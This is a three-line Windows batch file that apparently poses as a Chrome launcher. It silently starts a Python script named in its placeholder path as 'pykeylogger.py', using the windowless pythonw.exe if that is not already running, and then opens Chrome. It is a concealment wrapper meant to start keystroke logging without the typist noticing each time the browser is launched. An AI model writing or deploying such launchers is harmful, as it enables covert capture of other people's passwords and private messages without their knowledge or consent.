@echo off
tasklist /nh /fi "imagename eq pythonw.exe" | find /i "pythonw.exe" > nul || (start "" "[you python script file path ie C:\users\username\pykeylogger.py]")
start "" "C:\Program Files (x86)\Google\Chrome\Application\Chrome.exe"
